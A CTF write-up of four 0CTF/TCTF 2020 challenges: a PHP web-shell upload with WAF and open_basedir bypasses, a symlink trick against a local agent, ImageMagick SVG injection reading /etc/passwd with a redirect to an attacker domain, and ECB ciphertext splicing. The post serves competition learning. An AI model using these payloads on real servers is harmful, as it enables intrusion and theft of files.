---
title: "0CTF/TCTF 2020 Quals"
id: "en/0ctf-tctf-2020-quals"
publishDate: "1 Jul 2020"
description: ""
---

For the next CTF, I joined the [We_0wn_Y0u](https://ctftime.org/team/1964) team from Vienna, and we had a lot of fun! [0CTF/TCTF](https://ctftime.org/event/1026) was on June 27-28. We managed to solve 5 challenges and took 36th place. Below are the solutions to the hardest challenges:

- Web / easyphp [59 pts, 175 solved]
- Misc / Cloud Computing [211 pts, 42 solved]
- Misc / Cloud Computing v2 [275 pts, 18 solved]
- Web / Wechat Generator [261 pts, 32 solved]
- Web / Lottery [354 pts, 21 solved]


## Misc / Cloud Computing

> Welcome to our new cloud function computing platform, enjoy here.

The link lead to a page with the following source code:

```php
<?php

error_reporting(0);

include 'function.php';

$dir = 'sandbox/' . sha1($_SERVER['REMOTE_ADDR'] . $_SERVER['HTTP_USER_AGENT']) . '/';

if(!file_exists($dir)){
  mkdir($dir);
}

switch ($_GET["action"] ?? "") {
  case 'pwd':
    echo $dir;
    break;
  case 'upload':
    $data = $_GET["data"] ?? "";
    if (waf($data)) {
      die('waf sucks...');
    }
    file_put_contents("$dir" . "index.php", $data);
  case 'shell':
    initShellEnv($dir);
    include $dir . "index.php";
    break;
  default:
    highlight_file(__FILE__);
    break;
}
```

The system creates an independent sandbox for each IP + User-Agent pair. It is possible to upload a script (`action=="upload"`), and then execute it (`action=="shell"`). The task is to upload a web shell, and get flag through it.

The issue is that there is some sort of “WAF” (web application firewall) implemented, and if you try to upload arbitrary web shell, it is denied with an error `waf sucks...`

Through [little research](https://github.com/oioki/0ctf-tctf-2020/blob/master/misc/cloud-computing/waf_restrictions.py), we learn the restrictions of WAF:

- no more than 35 bytes in payload;
- allowed characters: `[a-z0-9]` some special characters `"$()/;<=>?[\]{}~`

By no means it was easy, but after some time and efforts we managed to bypass this filter. The shell is:

```php
<?;eval(${"\x5f\x47\x45\x54"}[0]);
```

It accepts the command from `0` GET parameter. We wrote a couple of helper scripts — one to [deploy](https://github.com/oioki/0ctf-tctf-2020/blob/master/misc/cloud-computing/deploy.py) the shell; another to [execute](https://github.com/oioki/0ctf-tctf-2020/blob/master/misc/cloud-computing/shell.py) commands in a more convenient way.

Now the goal is to get flag itself somehow, but it’s quite tricky, since the environment is quite restrictive, including `open_basedir`:

```sh
$ ./shell.py 'file_get_contents("/flag");'
<br />
<b>Warning</b>:  file_get_contents(): open_basedir restriction in effect. File(/flag) is not within the allowed path(s): (/var/www/html/sandbox/d026ece6aebbb6f817f11db1c56958b7a9ba5a03/
```

Some reconnaissance:

```sh
$ ./shell.py 'var_dump(scandir(__DIR__));'
array(3) {
  [0]=>
  string(1) "."
  [1]=>
  string(2) ".."
  [2]=>
  string(9) "index.php"
}

$ ./shell.py 'echo file_get_contents("http://checkip.amazonaws.com/");'
111.186.56.155
```

This one will come handy in the second part of the challenge (Cloud Computing 2):

```sh
$ ./shell.py 'echo file_get_contents("http://localhost");'
SuperSafeCloudAgent v1.0
```

As you remember, there is an `open_basedir` restriction, but thanks to [this tweet](https://twitter.com/eboda_/status/1113839230608797696), it could be bypassed via creation of sub-directory:

```sh
$ ./shell.py 'mkdir(__DIR__."/aaa");'
$ ./shell.py 'chdir(__DIR__."/aaa");ini_set("open_basedir","..");chdir("..");chdir("..");chdir("..");chdir("..");chdir("..");var_dump(scandir("/"));'
array(25) {
  ...
  [3]=>
  string(5) "agent"
  ...
  [9]=>
  string(4) "flag"
  ...
}
```

Now we can read out these interesting files, using base64 to preserve binary data:

```sh
$ ./shell.py 'chdir(__DIR__."/aaa");ini_set("open_basedir","..");chdir("..");chdir("..");chdir("..");chdir("..");chdir("..");ini_set("open_basedir","/");echo base64_encode(file_get_contents("/agent"));' | base64 -d > agent

$ ./shell.py 'chdir(__DIR__."/aaa");ini_set("open_basedir","..");chdir("..");chdir("..");chdir("..");chdir("..");chdir("..");ini_set("open_basedir","/");echo base64_encode(file_get_contents("/flag"));' | base64 -d > flag
```

Again, `agent` binary will be needed in the next challenge. Now let’s have a look at `flag` file:

```sh
$ file flag
flag: gzip compressed data, was "flag.img", last modified: Fri Jun 26 00:54:32 2020, from Unix
$ zcat flag > flag.img
$ file flag.img
flag.img: Linux rev 1.0 ext2 filesystem data (mounted or unclean), UUID=d4d08581-e309-4c51-990b-6472ba249420 (large files)
```

We tried to mount it using `sudo mount -o loop flag.img ./mnt` but found nothing interesting inside. Maybe we did not dig deep enough, but another approach worked:

```sh
$ binwalk flag.img 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Linux EXT filesystem, rev 1.0, ext2 filesystem data (mounted or unclean), UUID=d4d08581-e309-4c51-990b-6472ba24ba24
46080         0xB400          PNG image, 728 x 100, 8-bit/color RGB, non-interlaced
46121         0xB429          Zlib compressed data, default compression

$ binwalk --dd='png:png:' flag.img
```

Extracted files will be in `./_flag.img.extracted`, and the flag is in B400.png:

![flag{do_u_like_cloud_computing}](/assets/blog/0ctf-tctf-2020-quals/image.png)

Of course we do…


## Misc / Cloud Computing v2

> Welcome to our new cloud function computing platform, enjoy the more restrictive version here.

This challenge is somehow continuation of previous one, with more restricted environment. For example, `chdir()` is disabled here, so we can’t bypass open_basedir restriction anymore. It turned out, the `agent` binary which is running on `localhost:80` is the key here.

To solve this challenge, it was important to understand what exactly [agent](https://github.com/oioki/0ctf-tctf-2020/blob/master/misc/cloud-computing-v2/agent) binary can do. Apparently, it is a Go binary which is based on [Echo](https://echo.labstack.com/) web framework. When running it locally, it shows the banner, but we don’t know correct routes…

Some reverse engineering would help here, but we went with much dumber brute-force approach. We have binary running locally, so we can actually do it:

```sh
$ ffuf -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://localhost/FUZZ
...
read                    [Status: 200, Size: 13, Words: 3, Lines: 1]
scan                    [Status: 200, Size: 13, Words: 3, Lines: 1]
init                    [Status: 200, Size: 13, Words: 3, Lines: 1]
                        [Status: 200, Size: 24, Words: 2, Lines: 1]
:: Progress: [1273833/1273833] :: Job [1/1] :: 19903 req/sec :: Duration: [0:01:04] :: Errors: 0 ::
```

Now, we need to understand what each of these routes does. After some research (looking at strings in the binary + ghidra decompiling + observing behavior on local + strace), we found out:

- `/init` has `dir` GET parameter; it creates `config.json` file in the specified directory, with following contents: `{"ban": "flag"}`
- `/scan` has `dir` GET parameter; it finds all `*.php` files in specified directory and empties them;
- `/read` has `dir` and `target` GET parameters. It just prints out the contents of the file specified in `target`, **but only** if the filename does not contain any of the characters specified in `dir/config.json` — in our case, any of `f`, `l`, `a`, `g`. For example, reading of `/etc/fstab` will fail because `fstab` contains `f` and `a`.

It took some amount of time and mental energy, but in the end we come up with the following solution:

1. Deploy the shell as we did in the first challenge.
2. In your sandbox, create a symlink `whatever.php` pointing to `config.json` (this symlink would be broken at the beginning);
3. Initialize the agent in your sandbox, this will write `{"ban": "flag"}` to `config.json`. After this step, `whatever.php` is no longer a broken symlink.
4. Fetch `/scan` to empty all `*.php` files, including `whatever.php`. This effectively empty the `config.json` file.
5. Also, this would empty the initial shell file, so we need to recover it.
6. Fetch `/read` to read out the flag at `/flag`. The trick here is when `config.json` is empty, then character-in-the-filename restriction no longer applies.

Actual commands to solve the problem:

```sh
$ ./deploy.py

$ ./shell.py 'symlink(__DIR__."/config.json", __DIR__."/whatever.php");'

$ ./shell.py '$url="http://localhost/init?dir=/var/www/html/$dir";echo file_get_contents("$url");'
success

$ ./shell.py '$url="http://localhost/scan?dir=/var/www/html/$dir";echo file_get_contents("$url");'
success

$ ./deploy.py

$ ./shell.py '$url="http://localhost/read?dir=/var/www/html/$dir";echo file_get_contents("$url&target=/flag");'
file contents:ZmxhZ3tkYzZhNzNhZjA1MmM2MTM1YjRjNjM1NmE0YWFmMGI1OH0K
```

and the base64-decoded flag is `flag{dc6a73af052c6135b4c6356a4aaf0b58}`


## Web / Wechat Generator

> Come and check my latest innovation! It’s normal to encounter some bugs and glitches since it is still in beta development.

![](/assets/blog/0ctf-tctf-2020-quals/image-1.png)

Screenshot of homepage
Clicking on Preview generates image on the backend and returns it as a base64-encoded string (suitable for displaying in browsers via `data:` URL) together with `previewid` UUID.

Clicking on Share, on the other hand, generates an URL based on specified `previewid`, for example: http://pwnable.org:5000/image/wNCByR/png. One can access such URL and download images in different formats by changing the last part of URL.

Some research showed that ImageMagick is running underneath, and there are lot of supported formats for the image URL, including `svg`, `pdf`, `jpg`, `htm`, etc.

We tried a lot of stuff, but eventually we realized that emojis which are implemented via custom `[emoji-name]` tag, are reflected directly in the resulting SVG file. For example, `[whatever<b>hello</b>]` results in:

```html
<image x="0" y="-60" height="100" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="http://pwnable.org:5000/static/emoji/whatever"><b>hello</b>...
```

Another piece of solution: suddenly, we realized that ImageMagick has this nice feature of including text in the rendering of the SVG image. For example, this payload:

```md
[smile.png"/><image width="1200" height="1200" href="text:/etc/passwd"/> <image href="x]
```

resulted in this encouraging output:

![](/assets/blog/0ctf-tctf-2020-quals/image-2.png)

I love you too!

Further reconnaissance took some time. Eventually, we found source code of the backend, located at `/app/app.py`:

![](/assets/blog/0ctf-tctf-2020-quals/image-3.png)

This source reveals the next step — secret endpoint:

![](/assets/blog/0ctf-tctf-2020-quals/image-4.png)

The URL should be located on the same origin `pwnable:5000`, so basically we need to find an XSS on Wechat Generator application. Trying something obvious like:

```md
[smile.png" /><script>_alert(1);</script><a href="smile]
```

However, this does not work:

![](/assets/blog/0ctf-tctf-2020-quals/image-5.png)

They have this quite strict Content-Security-Policy deployed:

```http
Content-Security-Policy: img-src * data:; default-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'self'; object-src 'none'; base-uri 'self'
```

Probably, we need to bypass CSP. The first issue is that `meta` and `src` HTML tags were stripped by the `app.py`. Looking again at the source code, we realized that it could be bypassed quite easily (note the “duplicated” tags):

```md
[smile.png" /><mmetaeta http-equiv="Content-Security-Policy" content="script-ssrcrc * 'unsafe-inline';"/><script>alert(1);</script><a href="smile]
```

resulted in:

```html
<image x="0" y="-60" height="100" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="http://pwnable.org:5000/static/emoji/smile.png" /><meta http-equiv="Content-Security-Policy" content="script-src * 'unsafe-inline';"/><script>alert(1);</script><a href="smile.png" />
```

However, this still does not work:

![](/assets/blog/0ctf-tctf-2020-quals/image-6.png)

[Never assume anything.](https://twitter.com/NahamSec/status/1263523329278791680) We thought that we need to bypass CSP, but actually we did not have to. What was said at secret page, is we need to trigger `alert(1)` on resulting page. Maybe simple HTML redirect will work?

```md
[smile.png" /><mmetaeta http-equiv="refresh" content="0; url=http://your-own-domain.com/alert_one/"/><a href="smile]
```

Our page hosts just a single page with `<script>alert(1);</script>`

This worked! And the flag is `flag{5Vg_1s_Pow3rFu1_y3T_D4n93r0u5_eba66e10}`


## Web / Lottery

This is a crypto-related challenge, which I enjoyed solving most of all. The application is some sort of lottery system with following rules:

- Users can register and login to the system
- Each new user gets 30 coins
- One can buy a lottery for 10 coins
- Lottery ticket contains random prize from 1 to 10 coins (funny enough)
- After purchase, a lottery could be redeemed. Only after this, the coins are added to the user’s balance
- To win, one needs to collect 99 coins.
- There is a simple JSON API for almost any action in this system.

By common sense, it is impossible to win in this lottery, because with every lottery you get less coins or at most, the same number of coins… So the general idea is to break “normal” flow somehow.

Let’s start from simple observations:

- API token is base64 of seemingly random 24 bytes
- Lottery `enc` is base64 of seemingly random 128 bytes
- Sample output of `/lottery/info` API with `enc` provided:

```json
{
  "info": {
    "lottery": "130b4728-010d-42d6-8d86-861d01975285",
    "user": "3f5de704-c88d-40c3-a468-a0e9a9d84b0a",
    "coin": 1
  }
}
```

I tried to buy two lotteries for the same user, and compared the produced bytes of lottery ID. Some of them were equal:

![](/assets/blog/0ctf-tctf-2020-quals/image-7.png)

The equal bytes in the middle of that `enc` and in the end of it shows that certain 16-byte blocks are used to encrypt the user ID. Moreover, the same sequence of bytes are encoded with the same ciphertext, and blocks do not affect ciphertext of other blocks. So, most probably we are dealing with ECB cipher mode, but we don’t know the algorithm. Maybe it is AES, maybe other. Also, we don’t know the key.

Another fact I found by issuing a lot of lottery tickets: the last 16 bytes of `enc` are `f6d2b7dade603f007022388485ecc5980` in almost all cases. The only exception is when number of coins in the lottery is 10. In this case then, the last 16 bytes are `f848667547817c08924b9e8614bfd758`.

By the looks of it, the output of `/lottery/info` (lottery UUID, the user UUID and amount of coins in the lottery) is somehow encoded in this sequence of bytes (`enc`). This, together with ECB cipher mode, gives an idea of how we can reach the needed balance of 99 coins.

We register one “acceptor” user whose goal is to collect all the money. Also, we register many “donor” users whose purpose would be to buy lottery tickets and somehow pass their prize to “acceptor” user. One way to do such transfer is to try to tamper a lottery ticket, joining certain byte blocks from first and the other lottery tickets.

Now, after CTF is over, I did more [comprehensive research](https://github.com/oioki/0ctf-tctf-2020/blob/master/web/lottery/enc-tampering.pdf) on the structure of enc value, see it here. The key finding is that block #4 (bytes 30:3f inclusively) is responsible for 2 last hex-digits of Lottery UUID and for the first 2 hex-digits of User ID:

![](/assets/blog/0ctf-tctf-2020-quals/image-9.png)

Presumed structure of enc plaintext
Now, the approach is more clear: we generate a lot of tickets by “donor” users and the only thing we need from them are first 3 blocks of encrypted lottery UUID. The rest of the bytes we take from the first lottery (of “acceptor” user).

![](/assets/blog/0ctf-tctf-2020-quals/image-10.png)

Graphical representation of the idea which we used for solution
The only issue is for that new ticket to be valid, we need to have 2 last hex-digits of lottery UUID matching to each other, otherwise the lottery would be “invalid”. Well, we can take our time and produce as much lotteries as we want. On average, once in 256 cases, we will get a lucky ticket. Maybe, hence the name of the challenge — “lottery”.

Here is the [implementation](https://github.com/oioki/0ctf-tctf-2020/blob/master/web/lottery/lottery.py) of whole idea. Run the script first without arguments, to get credentials for “acceptor”; then run as many instances as you want, with any argument. The more “donors”, the faster you will get to 100 coins.

![](/assets/blog/0ctf-tctf-2020-quals/mining.jpg)

Lucky lottery tickets mining…
Lovely outcome:

![](/assets/blog/0ctf-tctf-2020-quals/image-8.png)
